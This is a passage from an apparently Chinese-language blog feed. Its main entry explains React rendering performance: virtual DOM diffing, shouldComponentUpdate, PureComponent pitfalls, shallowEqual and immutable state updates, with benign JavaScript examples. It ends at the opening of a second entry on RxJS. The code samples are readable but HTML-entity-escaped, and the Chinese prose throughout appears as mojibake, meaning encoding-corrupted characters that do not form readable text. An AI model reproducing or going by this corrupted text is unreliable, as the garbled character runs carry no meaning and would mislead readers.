ç•¶ä½ æŒ‰ä¸‹æŒ‰éˆ•ï¼Œæ”¹è®Š state äº†ä»¥å¾Œï¼ŒåŸ·è¡Œé †åºéƒ½è·Ÿå‰›å‰›ä¸€æ¨£ï¼š

å‘¼å« App çš„ render
å‘¼å« Content çš„ render
æ‹¿åˆ° virtual DOM

é€™æ™‚å€™æ‹¿åˆ°çš„ virtual DOM æ‡‰è©²æœƒé•·å¾—åƒé€™æ¨£ï¼š
&#123;  tagName: &#x27;div&#x27;,  children: [    &#123;      tagName: &#x27;button&#x27;,      children: &#x27;setState&#x27;    &#125;, &#123;      tagName: &#x27;div&#x27;,      children: &#x27;world&#x27; // åªæœ‰é€™é‚Šè®Šäº†    &#125;  ]&#125;

è€Œ React çš„ virtual DOM diff æ¼”ç®—æ³•ï¼Œå°±æœƒç™¼ç¾åªæœ‰ä¸€å€‹åœ°æ–¹æ”¹è®Šï¼Œç„¶å¾ŒæŠŠé‚£é‚Šçš„æ–‡å­—æ›¿æ›æ‰ï¼Œå…¶ä»–éƒ¨åˆ†éƒ½ä¸æœƒå‹•åˆ°ã€‚
å…¶å¯¦å®˜æ–¹æ–‡ä»¶æŠŠé€™ä¸€æ®µå¯«å¾—å¾ˆå¥½ï¼š

When you use React, at a single point in time you can think of the render() function as creating a tree of React elements. On the next state or props update, that render() function will return a different tree of React elements. React then needs to figure out how to efficiently update the UI to match the most recent tree.

å¤§æ„å°±æ˜¯ä½ å¯ä»¥æƒ³åƒæˆ render function æœƒå›å‚³ä¸€å€‹ React elements çš„ treeï¼Œç„¶å¾Œ React æœƒæŠŠé€™æ¬¡çš„ tree è·Ÿä¸Šæ¬¡çš„åšæ¯”è¼ƒï¼Œä¸¦ä¸”æ‰¾å‡ºå¦‚ä½•æœ‰æ•ˆç‡åœ°æŠŠé€™å·®ç•° update åˆ° UI ä¸Šé¢å»ã€‚
æ‰€ä»¥èªªå‘¢ï¼Œå¦‚æœä½ è¦æˆåŠŸæ›´æ–°ç•«é¢ï¼Œä½ å¿…é ˆç¶“éå…©å€‹æ­¥é©Ÿï¼š

render function
virtual DOM diff

å› æ­¤ï¼Œè¦å„ªåŒ–æ•ˆèƒ½çš„è©±ä½ æœ‰å…©å€‹æ–¹å‘ï¼Œé‚£å°±æ˜¯ï¼š

ä¸è¦è§¸ç™¼ render function
ä¿æŒ virtual DOM çš„ä¸€è‡´

æˆ‘å€‘å…ˆå¾å¾Œè€…é–‹å§‹å§ï¼
æå‡ React æ•ˆèƒ½ï¼šä¿æŒ virtual DOM çš„ä¸€è‡´å› ç‚ºæœ‰äº† virtual DOM é€™ä¸€å±¤çš„å®ˆè­·ï¼Œé€šå¸¸ä½ ä¸å¿…å¤ªæ“”å¿ƒ React çš„æ•ˆèƒ½ã€‚
åƒæ˜¯æˆ‘å€‘é–‹é ­å•ç­”çš„ç¬¬ä¸€é¡Œï¼š
class Content extends React.Component &#123;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;  ReactDOM.render(  &lt;App /&gt;,  document.getElementById(&#x27;container&#x27;));

ä½ æ¯æ¬¡æŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œï¼Œç”±æ–¼ App çš„ state æ”¹è®Šäº†ï¼Œæ‰€ä»¥æœƒå…ˆè§¸ç™¼ App çš„ render functionï¼Œè€Œå› ç‚ºè£¡é¢æœ‰å›å‚³&lt;Content /&gt;ï¼Œæ‰€ä»¥ä¹Ÿæœƒè§¸ç™¼ Content çš„ render functionã€‚
å› æ­¤ä½ æ¯æŒ‰ä¸€æ¬¡æŒ‰éˆ•ï¼Œé€™å…©å€‹ component çš„ render function å°±æœƒå€‹åˆ¥è¢«å‘¼å«ä¸€æ¬¡ã€‚æ‰€ä»¥ç­”æ¡ˆæ˜¯C. render App! ä»¥åŠ render content!ï¼ˆå…©è€…çš„ render function éƒ½è¢«åŸ·è¡Œåˆ°ï¼‰
å¯æ˜¯å„˜ç®¡å¦‚æ­¤ï¼ŒçœŸçš„ DOM ä¸æœƒæœ‰ä»»ä½•è®ŠåŒ–ã€‚å› ç‚ºåœ¨ virtual DOM diff çš„æ™‚å€™ï¼ŒReact æœƒç™¼ç¾ä½ é€™æ¬¡è·Ÿä¸Šæ¬¡çš„ virtual DOM é•·å¾—ä¸€æ¨¡ä¸€æ¨£ï¼ˆå› ç‚ºæ²’æœ‰æ±è¥¿æ”¹è®Šå˜›ï¼‰ï¼Œå°±ä¸æœƒå° DOM åšä»»ä½•æ“ä½œã€‚
å¦‚æœèƒ½ç›¡é‡ç¶­æŒ virtual DOM çš„çµæ§‹ç›¸ä¼¼çš„è©±ï¼Œå¯ä»¥æ¸›å°‘ä¸€äº›ä¸å¿…è¦çš„æ“ä½œï¼Œåœ¨é€™é»ä¸Šå…¶å¯¦å¯ä»¥åšçš„å„ªåŒ–é‚„å¾ˆå¤šï¼Œå¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œè£¡é¢å¯«çš„å¾ˆè©³ç´°ã€‚
æå‡ React æ•ˆèƒ½ï¼šä¸è¦è§¸ç™¼ render functioné›–ç„¶ä¸å¿…å¤ªéæ“”å¿ƒï¼Œä½†æ˜¯ virtual DOM diff ä¹Ÿæ˜¯éœ€è¦åŸ·è¡Œæ™‚é–“çš„ã€‚é›–ç„¶èªªé€Ÿåº¦å¾ˆå¿«ï¼Œä½†å†å¿«ä¹Ÿæ¯”ä¸ä¸Šå®Œå…¨ä¸å‘¼å«ä¾†çš„å¿«ï¼Œä½ èªªæ˜¯å§ã€‚
å°æ–¼é€™ç¨®ã€Œæˆ‘å€‘å·²ç¶“æ˜ç¢ºçŸ¥é“ä¸è©²æœ‰è®ŠåŒ–ã€çš„æƒ…å½¢ï¼Œæˆ‘å€‘é€£ render éƒ½ä¸è©²å‘¼å«ï¼Œå› ç‚ºæ²’å¿…è¦å˜›ï¼Œå†æ€éº¼å‘¼å«éƒ½æ˜¯ä¸€æ¨£çš„çµæœã€‚å¦‚æœ render æ²’æœ‰è¢«å‘¼å«çš„è©±ï¼Œé€£ virtual DOM diff éƒ½ä¸éœ€è¦åŸ·è¡Œï¼Œåˆæå‡äº†ä¸€äº›æ€§èƒ½ã€‚
ä½ æ‡‰è©²æœ‰è½éshouldComponentUpdateé€™å€‹ functionï¼Œå°±æ˜¯ä¾†åšé€™ä»¶äº‹çš„ã€‚å¦‚æœä½ åœ¨é€™å€‹ function ä¸­å›å‚³ falseï¼Œå°±ä¸æœƒé‡æ–°å‘¼å« render functionã€‚
class Content extends React.Component &#123;  shouldComponentUpdate () &#123;    return false;  &#125;  render () &#123;    console.log(&#x27;render content!&#x27;);    return &lt;div&gt;Content&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  handleClick = () =&gt; &#123;    this.setState(&#123;      a: 1    &#125;)  &#125;  render() &#123;    console.log(&#x27;render App!&#x27;);    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;

åŠ ä¸Šå»ä¹‹å¾Œï¼Œä½ æœƒç™¼ç¾ç„¡è«–ä½ æŒ‰å¤šæ¬¡æŒ‰éˆ•ï¼ŒContent çš„ render function éƒ½ä¸æœƒè¢«è§¸ç™¼ã€‚
ä½†æ˜¯é€™å€‹æ±è¥¿è«‹å°å¿ƒä½¿ç”¨ï¼Œä¸€å€‹ä¸æ³¨æ„ä½ å°±æœƒç¢°åˆ° state è·Ÿ UI æ­ä¸ä¸Šçš„æƒ…å½¢ï¼Œä¾‹å¦‚èªª state æ˜æ˜è®Šæˆ worldï¼Œå¯æ˜¯ UI é¡¯ç¤ºçš„é‚„æ˜¯ Helloï¼š
class Content extends React.Component &#123;  shouldComponentUpdate()&#123;    return false;  &#125;    render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;  class App extends React.Component &#123;  state = &#123;    text: &#x27;hello&#x27;  &#125;  handleClick = () =&gt; &#123;    this.setState(&#123;      text: &#x27;world&#x27;    &#125;)  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt;        &lt;Content text=&#123;this.state.text&#125; /&gt;      &lt;/div&gt;    );  &#125;&#125;

åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒæŒ‰ä¸‹æŒ‰éˆ•ä¹‹å¾Œ state ç¢ºå¯¦è®Šæˆworldï¼Œä½†æ˜¯å› ç‚º Content çš„shouldComponentUpdateæ°¸é éƒ½å›å‚³ falseï¼Œæ‰€ä»¥ä¸æœƒå†æ¬¡è§¸ç™¼ renderï¼Œå°±çœ‹ä¸åˆ°å°æ‡‰çš„æ–°çš„ state çš„ç•«é¢äº†ã€‚
ä¸éé€™æœ‰é»æ¥µç«¯ï¼Œå› ç‚ºé€šå¸¸ä¸æœƒæ°¸é éƒ½å›å‚³ falseï¼Œé™¤éä½ çœŸçš„ç¢ºå®šé€™å€‹ component å®Œå…¨ä¸éœ€è¦ re-renderã€‚
æ¯”èµ·é€™å€‹ï¼Œæœ‰ä¸€å€‹æ›´åˆç†çš„åˆ¤æ–·åŸºæº–æ˜¯ï¼š

å¦‚æœæ¯ä¸€å€‹ props è·Ÿ state éƒ½æ²’æœ‰è®Šï¼Œé‚£å°±å›å‚³ false

class Content extends React.Component &#123;  shouldComponentUpdate(nextProps, nextState)&#123;    return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState);  &#125;    render () &#123;    return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt;  &#125;&#125;

å‡è¨­this.propsæ˜¯ï¼š
&#123;  text: &#x27;hello&#x27;&#125;

è€ŒnextPropsæ˜¯ï¼š
&#123;  text: &#x27;world&#x27;&#125;

é‚£åœ¨æ¯”è¼ƒçš„æ™‚å€™å°±æœƒç™¼ç¾props.textè®Šäº†ï¼Œå°±å¯ä»¥é †ç†æˆç« çš„å‘¼å« render functionã€‚é‚„æœ‰å¦å¤–ä¸€é»æ˜¯é€™é‚Šç”¨shallowEqualä¾†æ¯”è¼ƒå‰å¾Œçš„å·®ç•°ï¼Œè€Œä¸æ˜¯ç”¨deepEqualã€‚
é€™æ˜¯å‡ºæ–¼æ•ˆèƒ½ä¸Šçš„è€ƒé‡ã€‚åˆ¥å¿˜äº†ï¼Œä½ è¦åŸ·è¡Œé€™æ¨£çš„æ¯”è¼ƒä¹Ÿæ˜¯æœƒåƒè³‡æºçš„ï¼Œå°¤å…¶æ˜¯åœ¨ä½ çš„ object å¾ˆæ·±å¾ˆæ·±çš„æ™‚å€™ï¼Œè¦æ¯”è¼ƒçš„æ±è¥¿å¯å°±å¤šäº†ï¼Œå› æ­¤æˆ‘å€‘æœƒå‚¾å‘ç”¨shallowEqualï¼Œåªè¦æ¯”è¼ƒä¸€å±¤å³å¯ã€‚
å¦å¤–ï¼Œå‰é¢æœ‰æåˆ°PureComponenté€™å€‹æ±è¥¿ï¼Œå…¶å¯¦å°±æ˜¯ React æä¾›çš„å¦å¤–ä¸€ç¨®å…ƒä»¶ï¼Œå·®åˆ¥å°±æ˜¯åœ¨æ–¼å®ƒè‡ªå‹•å¹«ä½ åŠ ä¸Šä¸Šé¢é‚£ä¸€æ®µçš„æ¯”è¼ƒã€‚å¦‚æœä½ æƒ³çœ‹åŸå§‹ç¢¼çš„è©±ï¼Œåœ¨é€™é‚Šï¼š
if (type.prototype &amp;&amp; type.prototype.isPureReactComponent) &#123;  return (    !shallowEqual(oldProps, newProps) || !shallowEqual(oldState, newState)  );&#125;

è¬›åˆ°é€™é‚Šï¼Œå°±å¯ä»¥ä¾†å…¬ä½ˆç¬¬äºŒé¡Œçš„è§£ç­”äº†ï¼Œç­”æ¡ˆæ˜¯ï¼šA. æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ PureComponent æœƒæ¯” Component æœ‰æ•ˆç‡ï¼Œå› ç‚ºç¹¼æ‰¿äº† PureComponent ä¹‹å¾Œï¼Œåªè¦ props è·Ÿ state æ²’è®Šï¼Œå°±ä¸æœƒåŸ·è¡Œ render functionï¼Œä¹Ÿä¸æœƒåŸ·è¡Œ virtual DOM diffï¼Œç¯€çœäº†è¨±å¤šé–‹éŠ·ã€‚
shallowEqual èˆ‡ Immutable data structuresä½ å‰›é–‹å§‹åœ¨å­¸ React çš„æ™‚å€™ï¼Œå¯èƒ½æœƒè¢«å‘Šèª¡èªªå¦‚æœè¦æ›´æ”¹è³‡æ–™ï¼Œä¸èƒ½å¤ é€™æ¨£å¯«ï¼š
// ä¸èƒ½é€™æ¨£const newObject = this.state.objnewObject.id = 2;this.setState(&#123;  obj: newObject&#125;)  // ä¹Ÿä¸èƒ½é€™æ¨£const arr = this.state.arr;arr.push(123);this.setState(&#123;  list: arr&#125;)

è€Œæ˜¯æ‡‰è©²è¦é€™æ¨£ï¼š
this.setState(&#123;  obj: &#123;    ...this.state.obj,    id: 2  &#125;&#125;)  this.setState(&#123;  list: [...this.state.arr, 123]&#125;)

ä½†ä½ çŸ¥é“ç‚ºä»€éº¼å—ï¼Ÿ
é€™å€‹å°±è·Ÿæˆ‘å€‘ä¸Šé¢è¬›åˆ°çš„æ±è¥¿æœ‰é—œäº†ã€‚å¦‚åŒä¸Šé¢æ‰€è¿°ï¼Œå…¶å¯¦ä½¿ç”¨PureComponentæ˜¯ä¸€ä»¶å¾ˆæ­£å¸¸çš„äº‹æƒ…ï¼Œå› ç‚º state è·Ÿ props å¦‚æœæ²’è®Šçš„è©±ï¼Œæœ¬ä¾†å°±ä¸è©²è§¸ç™¼ render functionã€‚
è€Œå‰›å‰›ä¹ŸæéPureComponentæœƒå¹«ä½ shallowEqual state è·Ÿ propsï¼Œæ±ºå®šè¦ä¸è¦å‘¼å« render functionã€‚
åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œå¦‚æœä½ ç”¨äº†ä¸€é–‹å§‹è¬›çš„é‚£ç¨®å¯«æ³•ï¼Œå°±æœƒç”¢ç”Ÿå•é¡Œï¼Œä¾‹å¦‚èªªï¼š
const newObject = this.state.objnewObject.id = 2;this.setState(&#123;  obj: newObject&#125;)

åœ¨ä¸Šé¢çš„ç¨‹å¼ç¢¼ä¸­ï¼Œå…¶å¯¦this.state.objè·ŸnewObjecté‚„æ˜¯æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶ï¼ŒæŒ‡å‘åŒä¸€å¡Šè¨˜æ†¶é«”ï¼Œæ‰€ä»¥ç•¶æˆ‘å€‘åœ¨åšshallowEqualçš„æ™‚å€™ï¼Œå°±æœƒåˆ¤æ–·å‡ºé€™å…©å€‹æ±è¥¿æ˜¯ç›¸ç­‰çš„ï¼Œå°±ä¸æœƒåŸ·è¡Œ render function äº†ã€‚
åœ¨é€™æ™‚å€™ï¼Œæˆ‘å€‘å°±éœ€è¦ Immutable dataï¼ŒImmutable ç¿»æˆä¸­æ–‡å°±æ˜¯æ°¸é ä¸è®Šçš„ï¼Œæ„æ€å°±æ˜¯ï¼šã€Œç•¶ä¸€å€‹è³‡æ–™è¢«å‰µå»ºä¹‹å¾Œï¼Œå°±æ°¸é ä¸æœƒè®Šäº†ã€ã€‚é‚£å¦‚æœæˆ‘éœ€è¦æ›´æ”¹è³‡æ–™çš„è©±æ€éº¼è¾¦å‘¢ï¼Ÿä½ å°±åªèƒ½å‰µä¸€å€‹æ–°çš„ã€‚
const obj = &#123;  id: 1,  text: &#x27;hello&#x27;&#125;  obj.text = &#x27;world&#x27; // é€™æ¨£ä¸è¡Œï¼Œå› ç‚ºä½ æ”¹è®Šäº† obj é€™å€‹ç‰©ä»¶  // ä½ å¿…é ˆè¦åƒé€™æ¨£å‰µé€ ä¸€å€‹æ–°çš„ç‰©ä»¶const newObj = &#123;  ...obj,  text: &#x27;world&#x27;&#125;

æœ‰äº† Immutable çš„æ¦‚å¿µä¹‹å¾Œï¼ŒshallowEqualå°±ä¸æœƒå‡ºéŒ¯äº†ï¼Œå› ç‚ºå¦‚æœæˆ‘å€‘æœ‰æ–°çš„è³‡æ–™ï¼Œå°±å¯ä»¥ä¿è­‰å®ƒæ˜¯ä¸€å€‹æ–°çš„ objectï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘åœ¨ç”¨setStateçš„æ™‚å€™ç¸½æ˜¯è¦ç”¢ç”Ÿä¸€å€‹æ–°çš„ç‰©ä»¶ï¼Œè€Œä¸æ˜¯ç›´æ¥å°ç¾æœ‰çš„åšæ“ä½œã€‚
// æ²’æœ‰ Immutable çš„æ¦‚å¿µå‰ const props = &#123;  id: 1,  list: [1, 2, 3]&#125;  const list = props.list;list.push(4)nextProps = &#123;  ...props,  list&#125;  props.list === nextProps.list // true  // æœ‰äº† Immutable çš„æ¦‚å¿µå¾Œconst props = &#123;  id: 1,  list: [1, 2, 3]&#125;  const nextProps = &#123;  ...props,  list: [...props.list, 4]&#125;  props.list === nextProps.list // false

é€™é‚Šé‚„æœ‰ä¸€å€‹è¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ spread operator åªæœƒè¤‡è£½ç¬¬ä¸€å±¤çš„è³‡æ–™è€Œå·²ï¼Œå®ƒä¸¦ä¸æ˜¯ deep cloneï¼š
const test = &#123;  a: 1,  nest: &#123;    title: &#x27;hello&#x27;  &#125;&#125;  const copy = &#123;...test&#125;  copy.nest === test.nest // true

æ‰€ä»¥ç•¶ä½ çš„ state æ˜¯æ¯”è¼ƒè¤‡é›œçš„çµæ§‹æ™‚ï¼Œè¦æ”¹è®Šè³‡æ–™å°±æœƒè®Šå¾—æ¯”è¼ƒéº»ç…©ä¸€é»ï¼Œå› ç‚ºä½ å¿…é ˆè¦å°æ¯ä¸€å±¤éƒ½åšå·®ä¸å¤šçš„äº‹æƒ…ï¼Œé¿å…ç›´æ¥å»æ”¹åˆ°ä½ è¦æ”¹çš„ç‰©ä»¶ï¼š
// æ²’æœ‰ Immutable çš„æ¦‚å¿µå‰ const props = &#123;  title: &#x27;123&#x27;,  list: [    &#123;      id: 1,      name: &#x27;hello&#x27;    &#125;, &#123;      id: 2,      name: &#x27;world&#x27;    &#125;  ]&#125;  const list = props.list;list[1].name = &#x27;world2&#x27;; // ç›´æ¥æ”¹nextProps = &#123;  ...props,  list&#125;  props.list === nextProps.list // trueprops.list[1] === nextProps.list[1] // true  // æœ‰äº† Immutable çš„æ¦‚å¿µå¾Œconst props = &#123;  title: &#x27;123&#x27;,  list: [    &#123;      id: 1,      name: &#x27;hello&#x27;    &#125;, &#123;      id: 2,      name: &#x27;world&#x27;    &#125;  ]&#125;  // è¦æ³¨æ„é€™é‚Šåªæ˜¯ shallow copy è€Œå·²// list[0] === props.list[0] =&gt; trueconst list = [...props.list.slice(0, 1)]const data = props.list[1];  const nextProps = &#123;  ...props,  list: [...list, &#123;    ...data, // å†åšä¸€æ¬¡ spread oprator    name: &#x27;world2&#x27;  &#125;]&#125;  props.list === nextProps.list // falseprops.list[0] === nextProps.list[0] // trueprops.list[1] === nextProps.list[1] // false

è‹¥ä½ çš„ state çµæ§‹å¾ˆå¤šå±¤ï¼Œé‚£å°±æœƒè®Šå¾—éå¸¸éå¸¸é›£æ”¹ï¼Œé€™æ™‚å€™ä½ æœ‰ä¸‰å€‹é¸æ“‡ï¼š

é¿å…é€™éº¼å¤šå±¤çš„ stateï¼Œç›¡é‡å£“å¹³ï¼ˆå¯åƒè€ƒnormalizrï¼‰
æ‰¾ä¸€å€‹æœƒå¹«ä½ åš Immutable çš„ libraryï¼Œä¾‹å¦‚èªª Facebook çš„ Immutable.js
ç›´æ¥ç”¨ deep clone æŠŠè³‡æ–™å…¨éƒ¨è¤‡è£½ä¸‹ä¾†ï¼Œä¹‹å¾Œä½ æ„›æ€éº¼æ”¹å°±æ€éº¼æ”¹ï¼ˆä¸æ¨è–¦ï¼‰

è¨»ï¼šæ„Ÿè¬ç¶²å‹ KanYueh Chen çš„æŒ‡æ­£ï¼Œè®“æˆ‘è£œä¸Šä¸Šé¢é€™ä¸€æ®µã€‚
PureComponent çš„é™·é˜±ç•¶æˆ‘å€‘éµå®ˆ Immutable çš„è¦å‰‡ä¹‹å¾Œï¼Œç†æ‰€ç•¶ç„¶çš„å°±æœƒæƒ³æŠŠæ‰€æœ‰çš„ Component éƒ½è¨­æˆ PureComponentï¼Œå› ç‚º PureComponent çš„é è¨­å¾ˆåˆç†å˜›ï¼Œè³‡æ–™æ²’è®Šçš„è©±å°±ä¸å‘¼å« render functionï¼Œå¯ä»¥ç¯€çœå¾ˆå¤šä¸å¿…è¦çš„æ¯”è¼ƒã€‚
é‚£è®“æˆ‘å€‘å›é ­ä¾†çœ‹é–‹å ´å°æ¸¬é©—çš„æœ€å¾Œä¸€é¡Œï¼š
class Row extends PureComponent &#123;  render () &#123;    const &#123;item, style&#125; = this.props;    return (      &lt;tr style=&#123;style&#125;&gt;        &lt;td&gt;&#123;item.id&#125;&lt;/td&gt;      &lt;/tr&gt;    )  &#125;&#125;  class Table extends PureComponent &#123;  render() &#123;    const &#123;list&#125; = this.props;    const itemStyle = &#123;      color: &#x27;red&#x27;    &#125;    return (      &lt;table&gt;          &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125;      &lt;/table&gt;    )  &#125;&#125;

æˆ‘å€‘æŠŠRowè®Šæˆäº† PureComponentï¼Œæ‰€ä»¥åªè¦ state è·Ÿ props æ²’è®Šï¼Œå°±ä¸æœƒ re-renderï¼Œæ‰€ä»¥ç­”æ¡ˆæ‡‰è©²è¦æ˜¯A. æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ PureComponent æœƒæ¯” Component æœ‰æ•ˆç‡ï¼Ÿ
éŒ¯ï¼Œå¦‚æœä½ æŠŠç¨‹å¼ç¢¼çœ‹æ›´æ¸…æ¥šä¸€é»ï¼Œä½ æœƒç™¼ç¾ç­”æ¡ˆå…¶å¯¦æ˜¯C. ä¸æœƒï¼Œåœ¨é€™æƒ…æ³ä¸‹ Component æœƒæ¯” PureComponent æœ‰æ•ˆç‡ã€‚
ä½ çš„å‰ææ˜¯å°çš„ï¼Œã€Œåªè¦ state è·Ÿ props æ²’è®Šï¼Œå°±ä¸æœƒ re-renderï¼ŒPureComponent å°±æœƒæ¯” Component æ›´æœ‰æ•ˆç‡ã€ã€‚ä½†å…¶å¯¦é‚„æœ‰å¦å¤–ä¸€å¥è©±ä¹Ÿæ˜¯å°çš„ï¼šã€Œå¦‚æœä½ çš„ state æˆ– props ã€æ°¸é éƒ½æœƒè®Šã€ï¼Œé‚£ PureComponent ä¸¦ä¸æœƒæ¯”è¼ƒå¿«ã€ã€‚
æ‰€ä»¥é€™å…©ç¨®çš„ä½¿ç”¨æ™‚æ©Ÿå·®ç•°åœ¨æ–¼ï¼šstate è·Ÿ props åˆ°åº•å¸¸å¸¸æœƒè®Šé‚„æ˜¯ä¸æœƒè®Šï¼Ÿ
ä¸Šè¿°çš„ä¾‹å­ä¸­ï¼Œé™·é˜±åœ¨æ–¼itemStyleé€™å€‹ propsï¼Œæˆ‘å€‘æ¯æ¬¡ render çš„æ™‚å€™éƒ½å‰µå»ºäº†ä¸€å€‹æ–°çš„ç‰©ä»¶ï¼Œæ‰€ä»¥å° Row ä¾†èªªï¼Œå„˜ç®¡ props.item æ˜¯ä¸€æ¨£çš„ï¼Œä½†æ˜¯ props.style å»æ˜¯ã€Œæ¯æ¬¡éƒ½ä¸ä¸€æ¨£ã€ã€‚
å¦‚æœä½ å·²ç¶“çŸ¥é“æ¯æ¬¡éƒ½æœƒä¸ä¸€æ¨£ï¼Œé‚£ PureComponent é€™æ™‚å€™å°±ç„¡ç”¨æ­¦ä¹‹åœ°äº†ï¼Œè€Œä¸”é‚„æ›´ç³Ÿã€‚ç‚ºä»€éº¼ï¼Ÿå› ç‚ºå®ƒå¹«ä½ åšäº†shallowEqualã€‚
åˆ¥å¿˜è¨˜äº†ï¼ŒshallowEqualä¹Ÿæ˜¯éœ€è¦åŸ·è¡Œæ™‚é–“çš„ã€‚
å·²ç¶“çŸ¥é“ props çš„æ¯”è¼ƒæ¯æ¬¡éƒ½å¤±æ•—çš„è©±ï¼Œé‚£ä¸å¦‚ä¸è¦æ¯”é‚„æœƒä¾†çš„æ¯”è¼ƒå¿«ï¼Œæ‰€ä»¥åœ¨é€™å€‹æƒ…å½¢ä¸‹ï¼ŒComponent æœƒæ¯” PureComponent æœ‰æ•ˆç‡ï¼Œå› ç‚ºä¸ç”¨åšshallowEqualã€‚
é€™å°±æ˜¯æˆ‘é–‹é ­æåˆ°çš„éœ€è¦ç‰¹åˆ¥æ³¨æ„çš„éƒ¨åˆ†ã€‚ä¸è¦ä»¥ç‚ºä½ æŠŠæ¯å€‹ Component éƒ½æ›æˆ PureComponent å°±å¤©ä¸‹å¤ªå¹³ï¼ŒApp è®Šè¶…å¿«ï¼Œæ•ˆèƒ½æå‡å¥½å¹¾å€ã€‚ä¸å»æ³¨æ„é€™äº›ç´°ç¯€çš„è©±ï¼Œå°±æœ‰å¯èƒ½æŠŠæ•ˆèƒ½è¶Šå¼„è¶Šç³Ÿã€‚
æœ€å¾Œå†å¼·èª¿ä¸€æ¬¡ï¼Œå¦‚æœä½ å·²ç¶“é æœŸåˆ°æŸå€‹ component çš„ props æˆ–æ˜¯ state æœƒã€Œå¾ˆé »ç¹è®Šå‹•ã€ï¼Œé‚£ä½ æ ¹æœ¬ä¸ç”¨æ›æˆ PureComponentï¼Œå› ç‚ºä½ å¯¦ä½œä¹‹å¾Œåè€Œæœƒè®Šå¾—æ›´æ…¢ã€‚
ç¸½çµåœ¨ç ”ç©¶é€™äº›æ•ˆèƒ½ç›¸é—œçš„å•é¡Œæ™‚ï¼Œæˆ‘æœ€æ¨è–¦é€™ç¯‡ï¼šReact, Inline Functions, and Performanceï¼Œè§£é–‹äº†å¾ˆå¤šæˆ‘å¿ƒä¸­çš„ç–‘æƒ‘ä»¥åŠå¸¶çµ¦æˆ‘å¾ˆå¤šæ–°çš„æƒ³æ³•ã€‚
ä¾‹å¦‚èªªæ–‡æœ«æåˆ°çš„ PureComponent æœ‰æ™‚å€™åè€Œæœƒè®Šæ…¢ï¼Œä¹Ÿæ˜¯å¾é€™ç¯‡æ–‡ç« çœ‹ä¾†çš„ï¼ŒçœŸå¿ƒæ¨è–¦å¤§å®¶æŠ½ç©ºå»çœ‹çœ‹ã€‚
å‰é™£å­è·ŸåŒäº‹ä¸€èµ·æŠŠä¸€å€‹å°ˆæ¡ˆæ‰“æ‰é‡åšï¼ŒåŸæœ¬çš„å…±è­˜æ˜¯ç›¡é‡ç”¨ PureComponentï¼Œç›´åˆ°æˆ‘çœ‹åˆ°é€™ç¯‡æ–‡ä¸¦ä¸”ä»”ç´°æ€è€ƒäº†ä¸€ä¸‹ï¼Œç™¼ç¾å¦‚æœä½ ä¸çŸ¥é“èƒŒå¾Œçš„åŸç†ï¼Œé‚„æ˜¯ä¸è¦è¼•æ˜“ä½¿ç”¨æ¯”è¼ƒå¥½ã€‚å› æ­¤æˆ‘å°±æè­°æ”¹æˆå…¨éƒ¨ç”¨ Componentï¼Œç­‰æˆ‘å€‘ç¢°åˆ°æ•ˆèƒ½å•é¡Œè¦ä¾†å„ªåŒ–æ™‚å†æ…¢æ…¢èª¿æ•´ã€‚
æœ€å¾Œé™„ä¸Šä¸€å¥æˆ‘å¾ˆå–œæ­¡çš„è©±ï¼Œå¾React å·¢ç‹€ Component æ•ˆèƒ½å„ªåŒ–é€™ç¯‡çœ‹ä¾†çš„ï¼ˆé€™ç¯‡ä¹Ÿæ˜¯åœ¨è¬›æœ€å¾Œæåˆ°çš„ PureComponent çš„å•é¡Œï¼‰ï¼š

é›–ç„¶ä½ çŸ¥é“å¯ä»¥å„ªåŒ–ï¼Œä½†ä¸ä»£è¡¨ä½ æ‡‰è©²å„ªåŒ–ã€‚

åƒè€ƒè³‡æ–™ï¼šHigh Performance React: 3 New Tools to Speed Up Your Appsreactjs - Reconciliationreactjs- Optimizing PerformanceReact is Slow, React is Fast: Optimizing React Apps in PracticeEfficient React Components: A Guide to Optimizing React Performance
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>Reactive Programming ç°¡ä»‹èˆ‡æ•™å­¸(ä»¥ RxJS ç‚ºä¾‹)</title>
    <url>/2016/05/28/reactive-programming-intro-by-rxjs/</url>
    <content><![CDATA[Rx å…¶å¯¦ä¹Ÿå‡ºä¾†ä¸€æ®µæ™‚é–“äº†ï¼Œå‰é™£å­çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è§£é‡‹å¾—è »å¥½çš„ï¼Œæ“·å–é‡é»ä¸¦åŠ å…¥ä¸€äº›è‡ªå·±çš„å¿ƒå¾—ç¯„ä¾‹ä¾›å¤§å®¶åƒè€ƒï¼Œç•¢ç«Ÿ Rx ä¸­æ–‡çš„ä»‹ç´¹ä¼¼ä¹å°‘äº†é»â€¦
